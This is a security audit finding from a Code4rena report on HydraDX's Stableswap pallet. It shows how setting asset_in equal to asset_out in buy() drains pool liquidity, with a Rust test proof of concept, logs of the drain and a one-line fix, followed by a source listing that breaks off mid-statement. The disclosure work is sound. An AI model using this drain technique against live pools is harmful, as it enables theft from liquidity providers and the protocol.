{
  "Title": "[H-01] An attacker possesses the capability to exhaust the entirety of liquidity within the stable swap pools by manipulating the buy function, specifically by setting the `asset_in` parameter equal to the `asset_out` parameter",
  "Content": "\n<https://github.com/code-423n4/2024-02-hydradx/blob/603187123a20e0cb8a7ea85c6a6d718429caad8d/HydraDX-node/pallets/stableswap/src/lib.rs#L787-L842><br>\n<https://github.com/code-423n4/2024-02-hydradx/blob/603187123a20e0cb8a7ea85c6a6d718429caad8d/HydraDX-node/math/src/stableswap/math.rs#L40-L41>\n\n### Impact\n\nThis vulnerability has been identified in the Stableswap pallet that could potentially drain all liquidity from all pools without any permissions. This vulnerability can be exploited by malicious actors, resulting in significant financial losses for both the protocol and liquidity providers.\n\n### Proof of Concept\n\nThe vulnerability lies in the `buy()` function, which can be exploited by setting `asset_in` to an asset already present in the pool and subsequently setting `asset_out` to the same asset. The function does not validate or prevent this input, allowing an attacker to receive the entire a`mount_out` without providing any corresponding `amount_in`.\n\n**Attack Flow:**\n\n1. The attacker calls the function `buy` and specifies the `asset_in` equal to `asset_out`, the function has no check that prevents this input to be passed.\n\n2. The function will calculate the `amount_in` that should be taken out from the user, so the function will use `calculate_in_amount` function as shown [here](https://github.com/code-423n4/2024-02-hydradx/blob/603187123a20e0cb8a7ea85c6a6d718429caad8d/HydraDX-node/pallets/stableswap/src/lib.rs#L814) this function will call `calculate_in_given_out_with_fee()` function.\n\n```rust\n                        let (amount_in, fee_amount) = Self::calculate_in_amount(pool_id, asset_in, asset_out, amount_out)?;\n```\n\n3. The function `calculate_in_given_out_with_fee` [here](https://github.com/code-423n4/2024-02-hydradx/blob/603187123a20e0cb8a7ea85c6a6d718429caad8d/HydraDX-node/math/src/stableswap/math.rs#L98) will call the function `calculate_in_given_out` to calculate `amount_in`, and the final `amount_in` will be the amount calculated plus the fees,  and the fees are calculated as the ratio of the `amount_in`.\n\n4. **In the function `calculate_in_given_out`, since the `asset_in` is equal to `asset_out` then the `new_reserve_in` will be equal to the old reserve `reserves[idx_in]`. Therefore, the `amount_in`, which is the difference between the new and the old reserves, will be equal to zero** as shown [here](https://github.com/code-423n4/2024-02-hydradx/blob/603187123a20e0cb8a7ea85c6a6d718429caad8d/HydraDX-node/math/src/stableswap/math.rs#L71-L79), and then the function will add 1 to the `amount_in`.\n\n```rust\n        let new_reserve_in = calculate_y_given_out::<D, Y>(amount_out, idx_in, idx_out, &reserves, amplification)?;\n        let amount_in = new_reserve_in.checked_sub(reserves[idx_in])?;\n        let amount_in = normalize_value(\n                amount_in,\n                TARGET_PRECISION,\n                initial_reserves[idx_in].decimals,\n                Rounding::Up,\n        );\n        Some(amount_in.saturating_add(1u128))\n```\n\nThis will result in ` amount_in = 1  ` and with the fee, it will be equal to  `amount_in = 1.001`.\n\n**If the attacker set `amount_out = 100_000_000_000_000` he will take them and only pay `amount_in = 1.001`.**\n\n### Coded POC to demonstrate the vulnerability\n\nConsider add this test into the test file `trade.rs` [here](https://github.com/code-423n4/2024-02-hydradx/blob/main/HydraDX-node/pallets/stableswap/src/tests/trades.rs), and see the logs resulted from this test:\n\n```rust\n#[test]\nfn test_set_asset_in_equal_asset_out_will_be_profitable() {\n\tlet asset_a: AssetId = 1;\n\tlet asset_b: AssetId = 2;\n\tlet dec_a: u8 = 18;\n\tlet dec_b: u8 = 6;\n\tExtBuilder::default()\n\t\t.with_endowed_accounts(vec![\n\t\t\t(BOB, asset_a, to_precision!(200, dec_a)),\n\t\t\t(ALICE, asset_a, to_precision!(200, dec_a)),\n\t\t\t(ALICE, asset_b, to_precision!(200, dec_b)),\n\t\t])\n\t\t.with_registered_asset(\"one\".as_bytes().to_vec(), 1, dec_a)\n\t\t.with_registered_asset(\"two\".as_bytes().to_vec(), 2, dec_b)\n\t\t.with_pool(\n\t\t\tALICE,\n\t\t\tPoolInfo::<AssetId, u64> {\n\t\t\t\tassets: vec![asset_a, asset_b].try_into().unwrap(),\n\t\t\t\tinitial_amplification: NonZeroU16::new(100).unwrap(),\n\t\t\t\tfinal_amplification: NonZeroU16::new(100).unwrap(),\n\t\t\t\tinitial_block: 0,\n\t\t\t\tfinal_block: 0,\n\t\t\t\tfee: Permill::from_float(0.01),\n\t\t\t},\n\t\t\tInitialLiquidity {\n\t\t\t\taccount: ALICE,\n\t\t\t\tassets: vec![\n\t\t\t\t\tAssetAmount::new(asset_a, to_precision!(100, dec_a)),\n\t\t\t\t\tAssetAmount::new(asset_b, to_precision!(100, dec_b)),\n\t\t\t\t],\n\t\t\t},\n\t\t)\n\t\t.build()\n\t\t.execute_with(|| {\n\t\t\tlet pool_id = get_pool_id_at(0);\n\t\t\tlet pool_account = pool_account(pool_id);\n\t\t\tlet asset_a_state_before = Tokens::free_balance(asset_a, &pool_account);\n\n\t\t\tlet balance_before = Tokens::free_balance(asset_a, &BOB);\n\t\t\tfor _ in 0..5 {\n\t\t\t\tassert_ok!(Stableswap::buy(\n\t\t\t\t\tRuntimeOrigin::signed(BOB),\n\t\t\t\t\tpool_id,\n\t\t\t\t\tasset_a,\n\t\t\t\t\tasset_a,\n\t\t\t\t\tto_precision!(20, dec_a),\n\t\t\t\t\tto_precision!(31, dec_a),\n\t\t\t\t));\n\t\t\t}\n\t\t\tlet asset_a_state_after = Tokens::free_balance(asset_a, &pool_account);\n\n\t\t\t// the user here received the fees\n\t\t\t// 229_999_999_999_999_999_994\n\t\t\tlet balance_after = Tokens::free_balance(asset_a, &BOB);\n\t\t\tprintln!(\n\t\t\t\t\"pool balance of asset a before the attack = {:?} \",\n\t\t\t\tasset_a_state_before\n\t\t\t);\n\t\t\tprintln!(\"pool balance of asset a after the attack  = {:?} \", asset_a_state_after);\n\n\t\t\tprintln!(\"balance of bob before the attack = {:?}\", balance_before);\n\t\t\tprintln!(\" balance of asset a owned by bob after the attack =  {:?}\", balance_after);\n\t\t\tprintln!(\" the amount of profit for BOB: {:?}\", balance_after - balance_before);\n\t\t});\n}\n```\n\nThe logs will be:\n\n```rust\nrunning 1 test\npool balance of asset a before the attack = 100000000000000000000 \npool balance of asset a after the attack  = 28 \nbalance of bob before the attack = 200000000000000000000\n balance of asset a owned by bob after the attack =  299999999999999999972\n the amount of profit for BOB: 99999999999999999972\n```\n\nAs shown here, Bob can drain almost all the liquidity of `asset_a` in the pool, and he can repeat this attack to drain all the assets exists in all the pools.\n\n### Recommended Mitigation Steps\n\nTo mitigate this vulnerability, it is crucial to prevent the setting of `asset_in` equal to `asset_out`. This can be achieved by adding the following line to the `buy()` function:\n\n```diff\n                pub fn buy(\n                        origin: OriginFor<T>,\n                        pool_id: T::AssetId,\n                        asset_out: T::AssetId,\n                        asset_in: T::AssetId,\n                        amount_out: Balance,\n                        max_sell_amount: Balance,\n                ) -> DispatchResult {\n                        let who = ensure_signed(origin)?;\n\n\n+                        ensure!(\n+                 asset_out != asset_in, Error::<T>::Invalid\n+                );\n```\n\nIntegrating this check into the `buy()` function will effectively prevent attackers from draining liquidity from the pool.\n\n### Assessed type\n\nInvalid Validation\n\n**[enthusiastmartin (HydraDX) confirmed and commented](https://github.com/code-423n4/2024-02-hydradx-findings/issues/58#issuecomment-1979165008):**\n > Nice one!\n\n***\n \n",
  "Impact": "HIGH",
  "Source": "https://code4rena.com/reports/2024-02-hydradx",
  "Code": [
    {
      "filename": "HydraDX-node/pallets/stableswap/src/lib.rs",
      "content": "// Copyright (C) 2020-2022  Intergalactic, Limited (GIB).\n// SPDX-License-Identifier: Apache-2.0\n\n// Licensed under the Apache License, Version 2.0 (the \"License\");\n// you may not use this file except in compliance with the License.\n// You may obtain a copy of the License at\n//\n// \thttp://www.apache.org/licenses/LICENSE-2.0\n//\n// Unless required by applicable law or agreed to in writing, software\n// distributed under the License is distributed on an \"AS IS\" BASIS,\n// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n// See the License for the specific language governing permissions and\n// limitations under the License.\n\n//! # Stableswap pallet\n//!\n//! Curve/stableswap AMM implementation.\n//!\n//! ## Overview\n//!\n//! Curve style AMM at is designed to provide highly efficient and low-slippage trades for stablecoins.\n//!\n//! ### Stableswap Hooks\n//!\n//! Stableswap pallet supports multiple hooks which are triggerred on certain operations:\n//! - on_liquidity_changed - called when liquidity is added or removed from the pool\n//! - on_trade - called when trade is executed\n//!\n//! This is currently used to update on-chain oracle.\n//!\n//! ### Terminology\n//!\n//! * **LP** - liquidity provider\n//! * **Share Token** - a token representing share asset of specific pool. Each pool has its own share token.\n//! * **Amplification** - curve AMM pool amplification parameter\n//!\n//! ## Assumptions\n//!\n//! Maximum number of assets in pool is 5.\n//!\n//! A pool can be created only by allowed `AuthorityOrigin`.\n//!\n//! First LP to provided liquidity must add initial liquidity of all pool assets. Subsequent calls to add_liquidity, LP can provide only 1 asset.\n//!\n//! Initial liquidity is first liquidity added to the pool (that is first call of `add_liquidity`).\n//!\n//! LP is given certain amount of shares by minting a pool's share token.\n//!\n//! When LP decides to withdraw liquidity, it receives selected asset.\n//!\n#![cfg_attr(not(feature = \"std\"), no_std)]\n\nextern crate core;\n\nuse frame_support::pallet_prelude::{DispatchResult, Get};\nuse frame_support::{ensure, require_transactional, transactional};\nuse frame_system::pallet_prelude::BlockNumberFor;\nuse hydradx_traits::{registry::InspectRegistry, AccountIdFor};\npub use pallet::*;\nuse sp_runtime::traits::{BlockNumberProvider, Zero};\nuse sp_runtime::{ArithmeticError, DispatchError, Permill, SaturatedConversion};\nuse sp_std::num::NonZeroU16;\nuse sp_std::prelude::*;\nuse sp_std::vec;\n\nmod trade_execution;\npub mod types;\npub mod weights;\n\npub use trade_execution::*;\n\nuse crate::types::{AssetAmount, Balance, PoolInfo, PoolState, StableswapHooks, Tradability};\nuse hydra_dx_math::stableswap::types::AssetReserve;\nuse hydradx_traits::pools::DustRemovalAccountWhitelist;\nuse orml_traits::MultiCurrency;\nuse sp_std::collections::btree_map::BTreeMap;\nuse weights::WeightInfo;\n\n#[cfg(test)]\npub(crate) mod tests;\n\n#[cfg(any(feature = \"runtime-benchmarks\", test))]\nmod benchmarks;\n\n#[cfg(feature = \"runtime-benchmarks\")]\npub use crate::types::BenchmarkHelper;\n\n/// Stableswap account id identifier.\n/// Used as identifier to create share token unique names and account id.\npub const POOL_IDENTIFIER: &[u8] = b\"sts\";\n\npub const MAX_ASSETS_IN_POOL: u32 = 5;\n\nconst D_ITERATIONS: u8 = hydra_dx_math::stableswap::MAX_D_ITERATIONS;\nconst Y_ITERATIONS: u8 = hydra_dx_math::stableswap::MAX_Y_ITERATIONS;\n\n#[frame_support::pallet]\npub mod pallet {\n\tuse super::*;\n\tuse codec::HasCompact;\n\tuse core::ops::RangeInclusive;\n\tuse frame_support::pallet_prelude::*;\n\tuse frame_system::pallet_prelude::*;\n\tuse hydradx_traits::pools::DustRemovalAccountWhitelist;\n\tuse sp_runtime::traits::{BlockNumberProvider, Zero};\n\tuse sp_runtime::ArithmeticError;\n\tuse sp_runtime::Permill;\n\tuse sp_std::num::NonZeroU16;\n\n\t#[pallet::pallet]\n\tpub struct Pallet<T>(_);\n\n\t#[pallet::config]\n\tpub trait Config: frame_system::Config {\n\t\t/// The overarching event type.\n\t\ttype RuntimeEvent: From<Event<Self>> + IsType<<Self as frame_system::Config>::RuntimeEvent>;\n\n\t\t/// Provider for the current block number.\n\t\ttype BlockNumberProvider: BlockNumberProvider<BlockNumber = BlockNumberFor<Self>>;\n\n\t\t/// Identifier for the class of asset.\n\t\ttype AssetId: Member\n\t\t\t+ Parameter\n\t\t\t+ Ord\n\t\t\t+ Default\n\t\t\t+ Copy\n\t\t\t+ HasCompact\n\t\t\t+ MaybeSerializeDeserialize\n\t\t\t+ MaxEncodedLen\n\t\t\t+ TypeInfo;\n\n\t\t/// Multi currency mechanism\n\t\ttype Currency: MultiCurrency<Self::AccountId, CurrencyId = Self::AssetId, Balance = Balance>;\n\n\t\t/// Account ID constructor - pool account are derived from unique pool id\n\t\ttype ShareAccountId: AccountIdFor<Self::AssetId, AccountId = Self::AccountId>;\n\n\t\t/// Asset registry mechanism to check if asset is registered and retrieve asset decimals.\n\t\ttype AssetInspection: InspectRegistry<Self::AssetId>;\n\n\t\t/// The origin which can create a new pool\n\t\ttype AuthorityOrigin: EnsureOrigin<Self::RuntimeOrigin>;\n\n\t\t/// Account whitelist manager to exclude pool accounts from dusting mechanism.\n\t\ttype DustAccountHandler: DustRemovalAccountWhitelist<Self::AccountId, Error = DispatchError>;\n\n\t\t/// Hooks are actions executed on add_liquidity, sell or buy.\n\t\ttype Hooks: StableswapHooks<Self::AssetId>;\n\n\t\t/// Minimum pool liquidity\n\t\t#[pallet::constant]\n\t\ttype MinPoolLiquidity: Get<Balance>;\n\n\t\t/// Minimum trading amount\n\t\t#[pallet::constant]\n\t\ttype MinTradingLimit: Get<Balance>;\n\n\t\t/// Amplification inclusive range. Pool's amp can be selected from the range only.\n\t\t#[pallet::constant]\n\t\ttype AmplificationRange: Get<RangeInclusive<NonZeroU16>>;\n\n\t\t/// Weight information for extrinsics in this pallet.\n\t\ttype WeightInfo: WeightInfo;\n\n\t\t#[cfg(feature = \"runtime-benchmarks\")]\n\t\ttype BenchmarkHelper: BenchmarkHelper<Self::AssetId>;\n\t}\n\n\t/// Existing pools\n\t#[pallet::storage]\n\t#[pallet::getter(fn pools)]\n\tpub type Pools<T: Config> = StorageMap<_, Blake2_128Concat, T::AssetId, PoolInfo<T::AssetId, BlockNumberFor<T>>>;\n\n\t/// Tradability state of pool assets.\n\t#[pallet::storage]\n\t#[pallet::getter(fn asset_tradability)]\n\tpub type AssetTradability<T: Config> =\n\t\tStorageDoubleMap<_, Blake2_128Concat, T::AssetId, Blake2_128Concat, T::AssetId, Tradability, ValueQuery>;\n\n\t#[pallet::event]\n\t#[pallet::generate_deposit(pub(crate) fn deposit_event)]\n\tpub enum Event<T: Config> {\n\t\t/// A pool was created.\n\t\tPoolCreated {\n\t\t\tpool_id: T::AssetId,\n\t\t\tassets: Vec<T::AssetId>,\n\t\t\tamplification: NonZeroU16,\n\t\t\tfee: Permill,\n\t\t},\n\t\t/// Pool fee has been updated.\n\t\tFeeUpdated { pool_id: T::AssetId, fee: Permill },\n\t\t/// Liquidity of an asset was added to a pool.\n\t\tLiquidityAdded {\n\t\t\tpool_id: T::AssetId,\n\t\t\twho: T::AccountId,\n\t\t\tshares: Balance,\n\t\t\tassets: Vec<AssetAmount<T::AssetId>>,\n\t\t},\n\t\t/// Liquidity removed.\n\t\tLiquidityRemoved {\n\t\t\tpool_id: T::AssetId,\n\t\t\twho: T::AccountId,\n\t\t\tshares: Balance,\n\t\t\tamounts: Vec<AssetAmount<T::AssetId>>,\n\t\t\tfee: Balance,\n\t\t},\n\t\t/// Sell trade executed. Trade fee paid in asset leaving the pool (already subtracted from amount_out).\n\t\tSellExecuted {\n\t\t\twho: T::AccountId,\n\t\t\tpool_id: T::AssetId,\n\t\t\tasset_in: T::AssetId,\n\t\t\tasset_out: T::AssetId,\n\t\t\tamount_in: Balance,\n\t\t\tamount_out: Balance,\n\t\t\tfee: Balance,\n\t\t},\n\t\t/// Buy trade executed. Trade fee paid in asset entering the pool (already included in amount_in).\n\t\tBuyExecuted {\n\t\t\twho: T::AccountId,\n\t\t\tpool_id: T::AssetId,\n\t\t\tasset_in: T::AssetId,\n\t\t\tasset_out: T::AssetId,\n\t\t\tamount_in: Balance,\n\t\t\tamount_out: Balance,\n\t\t\tfee: Balance,\n\t\t},\n\n\t\t/// Asset's tradable state has been updated.\n\t\tTradableStateUpdated {\n\t\t\tpool_id: T::AssetId,\n\t\t\tasset_id: T::AssetId,\n\t\t\tstate: Tradability,\n\t\t},\n\n\t\t/// AAmplification of a pool has been scheduled to change.\n\t\tAmplificationChanging {\n\t\t\tpool_id: T::AssetId,\n\t\t\tcurrent_amplification: NonZeroU16,\n\t\t\tfinal_amplification: NonZeroU16,\n\t\t\tstart_block: BlockNumberFor<T>,\n\t\t\tend_block: BlockNumberFor<T>,\n\t\t},\n\t}\n\n\t#[pallet::error]\n\t#[cfg_attr(test, derive(PartialEq, Eq))]\n\tpub enum Error<T> {\n\t\t/// Creating a pool with same assets or less than 2 assets is not allowed.\n\t\tIncorrectAssets,\n\n\t\t/// Maximum number of assets has been exceeded.\n\t\tMaxAssetsExceeded,\n\n\t\t/// A pool with given assets does not exist.\n\t\tPoolNotFound,\n\n\t\t/// A pool with given assets already exists.\n\t\tPoolExists,\n\n\t\t/// Asset is not in the pool.\n\t\tAssetNotInPool,\n\n\t\t/// Share asset is not registered in Registry.\n\t\tShareAssetNotRegistered,\n\n\t\t/// Share asset is amount assets when creating a pool.\n\t\tShareAssetInPoolAssets,\n\n\t\t/// One or more assets are not registered in AssetRegistry\n\t\tAssetNotRegistered,\n\n\t\t/// Invalid asset amount provided. Amount must be greater than zero.\n\t\tInvalidAssetAmount,\n\n\t\t/// Balance of an asset is not sufficient to perform a trade.\n\t\tInsufficientBalance,\n\n\t\t/// Balance of a share asset is not sufficient to withdraw liquidity.\n\t\tInsufficientShares,\n\n\t\t/// Liquidity has not reached the required minimum.\n\t\tInsufficientLiquidity,\n\n\t\t/// Insufficient liquidity left in the pool after withdrawal.\n\t\tInsufficientLiquidityRemaining,\n\n\t\t/// Amount is less than the minimum trading amount configured.\n\t\tInsufficientTradingAmount,\n\n\t\t/// Minimum limit has not been reached during trade.\n\t\tBuyLimitNotReached,\n\n\t\t/// Maximum limit has been exceeded during trade.\n\t\tSellLimitExceeded,\n\n\t\t/// Initial liquidity of asset must be > 0.\n\t\tInvalidInitialLiquidity,\n\n\t\t/// Amplification is outside configured range.\n\t\tInvalidAmplification,\n\n\t\t/// Remaining balance of share asset is below asset's existential deposit.\n\t\tInsufficientShareBalance,\n\n\t\t/// Not allowed to perform an operation on given asset.\n\t\tNotAllowed,\n\n\t\t/// Future block number is in the past.\n\t\tPastBlock,\n\n\t\t/// New amplification is equal to the previous value.\n\t\tSameAmplification,\n\n\t\t/// Slippage protection.\n\t\tSlippageLimit,\n\n\t\t/// Failed to retrieve asset decimals.\n\t\tUnknownDecimals,\n\t}\n\n\t#[pallet::call]\n\timpl<T: Config> Pallet<T> {\n\t\t/// Create a stable pool with given list of assets.\n\t\t///\n\t\t/// All assets must be correctly registered in `T::AssetRegistry`.\n\t\t/// Note that this does not seed the pool with liquidity. Use `add_liquidity` to provide\n\t\t/// initial liquidity.\n\t\t///\n\t\t/// Parameters:\n\t\t/// - `origin`: Must be T::AuthorityOrigin\n\t\t/// - `share_asset`: Preregistered share asset identifier\n\t\t/// - `assets`: List of Asset ids\n\t\t/// - `amplification`: Pool amplification\n\t\t/// - `fee`: fee to be applied on trade and liquidity operations\n\t\t///\n\t\t/// Emits `PoolCreated` event if successful.\n\t\t#[pallet::call_index(0)]\n\t\t#[pallet::weight(<T as Config>::WeightInfo::create_pool())]\n\t\t#[transactional]\n\t\tpub fn create_pool(\n\t\t\torigin: OriginFor<T>,\n\t\t\tshare_asset: T::AssetId,\n\t\t\tassets: Vec<T::AssetId>,\n\t\t\tamplification: u16,\n\t\t\tfee: Permill,\n\t\t) -> DispatchResult {\n\t\t\tT::AuthorityOrigin::ensure_origin(origin)?;\n\n\t\t\tlet amplification = NonZeroU16::new(amplification).ok_or(Error::<T>::InvalidAmplification)?;\n\n\t\t\tlet pool_id = Self::do_create_pool(share_asset, &assets, amplification, fee)?;\n\n\t\t\tSelf::deposit_event(Event::PoolCreated {\n\t\t\t\tpool_id,\n\t\t\t\tassets,\n\t\t\t\tamplification,\n\t\t\t\tfee,\n\t\t\t});\n\n\t\t\tSelf::deposit_event(Event::AmplificationChanging {\n\t\t\t\tpool_id,\n\t\t\t\tcurrent_amplification: amplification,\n\t\t\t\tfinal_amplification: amplification,\n\t\t\t\tstart_block: T::BlockNumberProvider::current_block_number(),\n\t\t\t\tend_block: T::BlockNumberProvider::current_block_number(),\n\t\t\t});\n\t\t\tOk(())\n\t\t}\n\n\t\t/// Update pool's fee.\n\t\t///\n\t\t/// if pool does not exist, `PoolNotFound` is returned.\n\t\t///\n\t\t/// Parameters:\n\t\t/// - `origin`: Must be T::AuthorityOrigin\n\t\t/// - `pool_id`: pool to update\n\t\t/// - `fee`: new pool fee\n\t\t///\n\t\t/// Emits `FeeUpdated` event if successful.\n\t\t#[pallet::call_index(1)]\n\t\t#[pallet::weight(<T as Config>::WeightInfo::update_pool_fee())]\n\t\t#[transactional]\n\t\tpub fn update_pool_fee(origin: OriginFor<T>, pool_id: T::AssetId, fee: Permill) -> DispatchResult {\n\t\t\tT::AuthorityOrigin::ensure_origin(origin)?;\n\n\t\t\tPools::<T>::try_mutate(pool_id, |maybe_pool| -> DispatchResult {\n\t\t\t\tlet pool = maybe_pool.as_mut().ok_or(Error::<T>::PoolNotFound)?;\n\n\t\t\t\tpool.fee = fee;\n\t\t\t\tSelf::deposit_event(Event::FeeUpdated { pool_id, fee });\n\t\t\t\tOk(())\n\t\t\t})\n\t\t}\n\n\t\t/// Update pool's amplification.\n\t\t///\n\t\t/// Parameters:\n\t\t/// - `origin`: Must be T::AuthorityOrigin\n\t\t/// - `pool_id`: pool to update\n\t\t/// - `future_amplification`: new desired pool amplification\n\t\t/// - `future_block`: future block number when the amplification is updated\n\t\t///\n\t\t/// Emits `AmplificationUpdated` event if successful.\n\t\t#[pallet::call_index(2)]\n\t\t#[pallet::weight(<T as Config>::WeightInfo::update_amplification())]\n\t\t#[transactional]\n\t\tpub fn update_amplification(\n\t\t\torigin: OriginFor<T>,\n\t\t\tpool_id: T::AssetId,\n\t\t\tfinal_amplification: u16,\n\t\t\tstart_block: BlockNumberFor<T>,\n\t\t\tend_block: BlockNumberFor<T>,\n\t\t) -> DispatchResult {\n\t\t\tT::AuthorityOrigin::ensure_origin(origin)?;\n\n\t\t\tlet current_block = T::BlockNumberProvider::current_block_number();\n\t\t\tensure!(\n\t\t\t\tend_block > start_block && start_block >= current_block,\n\t\t\t\tError::<T>::PastBlock\n\t\t\t);\n\n\t\t\tPools::<T>::try_mutate(pool_id, |maybe_pool| -> DispatchResult {\n\t\t\t\tlet pool = maybe_pool.as_mut().ok_or(Error::<T>::PoolNotFound)?;\n\n\t\t\t\tlet current_amplification = Self::get_amplification(pool);\n\n\t\t\t\tensure!(\n\t\t\t\t\tcurrent_amplification != final_amplification as u128,\n\t\t\t\t\tError::<T>::SameAmplification\n\t\t\t\t);\n\n\t\t\t\tpool.initial_amplification =\n\t\t\t\t\tNonZeroU16::new(current_amplification.saturated_into()).ok_or(Error::<T>::InvalidAmplification)?;\n\t\t\t\tpool.final_amplification =\n\t\t\t\t\tNonZeroU16::new(final_amplification).ok_or(Error::<T>::InvalidAmplification)?;\n\t\t\t\tpool.initial_block = start_block;\n\t\t\t\tpool.final_block = end_block;\n\n\t\t\t\tensure!(\n\t\t\t\t\tT::AmplificationRange::get().contains(&pool.final_amplification),\n\t\t\t\t\tError::<T>::InvalidAmplification\n\t\t\t\t);\n\t\t\t\tSelf::deposit_event(Event::AmplificationChanging {\n\t\t\t\t\tpool_id,\n\t\t\t\t\tcurrent_amplification: pool.initial_amplification,\n\t\t\t\t\tfinal_amplification: pool.final_amplification,\n\t\t\t\t\tstart_block: pool.initial_block,\n\t\t\t\t\tend_block: pool.final_block,\n\t\t\t\t});\n\t\t\t\tOk(())\n\t\t\t})\n\t\t}\n\n\t\t/// Add liquidity to selected pool.\n\t\t///\n\t\t/// First call of `add_liquidity` must provide \"initial liquidity\" of all assets.\n\t\t///\n\t\t/// If there is liquidity already in the pool, LP can provide liquidity of any number of pool assets.\n\t\t///\n\t\t/// LP must have sufficient amount of each asset.\n\t\t///\n\t\t/// Origin is given corresponding amount of shares.\n\t\t///\n\t\t/// Parameters:\n\t\t/// - `origin`: liquidity provider\n\t\t/// - `pool_id`: Pool Id\n\t\t/// - `assets`: asset id and liquidity amount provided\n\t\t///\n\t\t/// Emits `LiquidityAdded` event when successful.\n\t\t#[pallet::call_index(3)]\n\t\t#[pallet::weight(<T as Config>::WeightInfo::add_liquidity()\n\t\t\t\t\t\t\t.saturating_add(T::Hooks::on_liquidity_changed_weight(MAX_ASSETS_IN_POOL as usize)))]\n\t\t#[transactional]\n\t\tpub fn add_liquidity(\n\t\t\torigin: OriginFor<T>,\n\t\t\tpool_id: T::AssetId,\n\t\t\tassets: Vec<AssetAmount<T::AssetId>>,\n\t\t) -> DispatchResult {\n\t\t\tlet who = ensure_signed(origin)?;\n\n\t\t\tlet shares = Self::do_add_liquidity(&who, pool_id, &assets)?;\n\n\t\t\tSelf::deposit_event(Event::LiquidityAdded {\n\t\t\t\tpool_id,\n\t\t\t\twho,\n\t\t\t\tshares,\n\t\t\t\tassets,\n\t\t\t});\n\n\t\t\tOk(())\n\t\t}\n\n\t\t/// Add liquidity to selected pool given exact amount of shares to receive.\n\t\t///\n\t\t/// Similar to `add_liquidity` but LP specifies exact amount of shares to receive.\n\t\t///\n\t\t/// This functionality is used mainly by on-chain routing when a swap between Omnipool asset and stable asset is performed.\n\t\t///\n\t\t/// Parameters:\n\t\t/// - `origin`: liquidity provider\n\t\t/// - `pool_id`: Pool Id\n\t\t/// - `shares`: amount of shares to receive\n\t\t/// - `asset_id`: asset id of an asset to provide as liquidity\n\t\t/// - `max_asset_amount`: slippage limit. Max amount of asset.\n\t\t///\n\t\t/// Emits `LiquidityAdded` event when successful.\n\t\t#[pallet::call_index(4)]\n\t\t#[pallet::weight(<T as Config>::WeightInfo::add_liquidity_shares()\n\t\t\t\t\t\t\t.saturating_add(T::Hooks::on_liquidity_changed_weight(MAX_ASSETS_IN_POOL as usize)))]\n\t\t#[transactional]\n\t\tpub fn add_liquidity_shares(\n\t\t\torigin: OriginFor<T>,\n\t\t\tpool_id: T::AssetId,\n\t\t\tshares: Balance,\n\t\t\tasset_id: T::AssetId,\n\t\t\tmax_asset_amount: Balance,\n\t\t) -> DispatchResult {\n\t\t\tlet who = ensure_signed(origin)?;\n\t\t\tlet amount_in = Self::do_add_liquidity_shares(&who, pool_id, shares, asset_id, max_asset_amount)?;\n\t\t\tSelf::deposit_event(Event::LiquidityAdded {\n\t\t\t\tpool_id,\n\t\t\t\twho,\n\t\t\t\tshares,\n\t\t\t\tassets: vec![AssetAmount::new(asset_id, amount_in)],\n\t\t\t});\n\n\t\t\tOk(())\n\t\t}\n\n\t\t/// Remove liquidity from selected pool.\n\t\t///\n\t\t/// Withdraws liquidity of selected asset from a pool.\n\t\t///\n\t\t/// Share amount is burned and LP receives corresponding amount of chosen asset.\n\t\t///\n\t\t/// Withdraw fee is applied to the asset amount.\n\t\t///\n\t\t/// Parameters:\n\t\t/// - `origin`: liquidity provider\n\t\t/// - `pool_id`: Pool Id\n\t\t/// - `asset_id`: id of asset to receive\n\t\t/// - 'share_amount': amount of shares to withdraw\n\t\t/// - 'min_amount_out': minimum amount to receive\n\t\t///\n\t\t/// Emits `LiquidityRemoved` event when successful.\n\t\t#[pallet::call_index(5)]\n\t\t#[pallet::weight(<T as Config>::WeightInfo::remove_liquidity_one_asset()\n\t\t\t\t\t\t\t.saturating_add(T::Hooks::on_liquidity_changed_weight(MAX_ASSETS_IN_POOL as usize)))]\n\t\t#[transactional]\n\t\tpub fn remove_liquidity_one_asset(\n\t\t\torigin: OriginFor<T>,\n\t\t\tpool_id: T::AssetId,\n\t\t\tasset_id: T::AssetId,\n\t\t\tshare_amount: Balance,\n\t\t\tmin_amount_out: Balance,\n\t\t) -> DispatchResult {\n\t\t\tlet who = ensure_signed(origin)?;\n\n\t\t\tensure!(\n\t\t\t\tSelf::is_asset_allowed(pool_id, asset_id, Tradability::REMOVE_LIQUIDITY),\n\t\t\t\tError::<T>::NotAllowed\n\t\t\t);\n\t\t\tensure!(share_amount > Balance::zero(), Error::<T>::InvalidAssetAmount);\n\n\t\t\tlet current_share_balance = T::Currency::free_balance(pool_id, &who);\n\t\t\tensure!(current_share_balance >= share_amount, Error::<T>::InsufficientShares);\n\t\t\tensure!(\n\t\t\t\tcurrent_share_balance == share_amount\n\t\t\t\t\t|| current_share_balance.saturating_sub(share_amount) >= T::MinPoolLiquidity::get(),\n\t\t\t\tError::<T>::InsufficientShareBalance\n\t\t\t);\n\n\t\t\t// Retrive pool state.\n\t\t\tlet pool = Pools::<T>::get(pool_id).ok_or(Error::<T>::PoolNotFound)?;\n\t\t\tlet asset_idx = pool.find_asset(asset_id).ok_or(Error::<T>::AssetNotInPool)?;\n\t\t\tlet pool_account = Self::pool_account(pool_id);\n\t\t\tlet initial_reserves = pool\n\t\t\t\t.reserves_with_decimals::<T>(&pool_account)\n\t\t\t\t.ok_or(Error::<T>::UnknownDecimals)?;\n\t\t\tlet share_issuance = T::Currency::total_issuance(pool_id);\n\n\t\t\tensure!(\n\t\t\t\tshare_issuance == share_amount\n\t\t\t\t\t|| share_issuance.saturating_sub(share_amount) >= T::MinPoolLiquidity::get(),\n\t\t\t\tError::<T>::InsufficientLiquidityRemaining\n\t\t\t);\n\n\t\t\tlet amplification = Self::get_amplification(&pool);\n\n\t\t\t//Calculate how much asset user will receive. Note that the fee is already subtracted from the amount.\n\t\t\tlet (amount, fee) = hydra_dx_math::stableswap::calculate_withdraw_one_asset::<D_ITERATIONS, Y_ITERATIONS>(\n\t\t\t\t&initial_reserves,\n\t\t\t\tshare_amount,\n\t\t\t\tasset_idx,\n\t\t\t\tshare_issuance,\n\t\t\t\tamplification,\n\t\t\t\tpool.fee,\n\t\t\t)\n\t\t\t.ok_or(ArithmeticError::Overflow)?;\n\n\t\t\tensure!(amount >= min_amount_out, Error::<T>::SlippageLimit);\n\n\t\t\t// Burn shares and transfer asset to user.\n\t\t\tT::Currency::withdraw(pool_id, &who, share_amount)?;\n\t\t\tT::Currency::transfer(asset_id, &pool_account, &who, 